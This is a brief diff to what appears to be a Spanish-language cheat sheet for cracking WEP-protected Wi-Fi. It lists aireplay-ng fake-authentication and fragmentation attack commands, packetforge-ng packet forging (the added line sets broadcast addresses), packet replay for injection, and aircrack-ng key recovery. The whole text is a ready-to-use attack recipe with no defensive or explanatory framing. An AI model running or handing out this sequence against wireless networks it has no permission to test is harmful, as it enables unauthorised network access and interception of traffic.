@@ -85,6 +85,7 @@ aireplay-ng -1 0 -e <essid_AP> -a <bssid_AP> -h <MAC_wlan0mon> wlan0mon
 aireplay-ng -5 -b <bssid_AP> -h <MAC_wlan0mon> wlan0mon						  (ataque de fragmentacion)
 packetforge-ng -0 -a <bssid_AP> -h <MAC_wlan0mon> -l <SOURCE_IP> -k <DEST_IP> -y <file .xor> -w <save_file_2>
 (packetforge-ng -0 -a <bssid_AP> -h <MAC_wlan0mon> -l 192.168.1.101 -k 192.168.1.255 -y <file .xor> -w injectmetoo.cap)
+(packetforge-ng -0 -a <bssid_AP> -h <MAC_wlan0mon> -l 255.255.255.255 -k 255.255.255.255 -y <file .xor> -w injectmetoo.cap)
 aireplay-ng -2 -r <save_file_2> wlan0mon
 aircrack-ng <file_.cap>
 
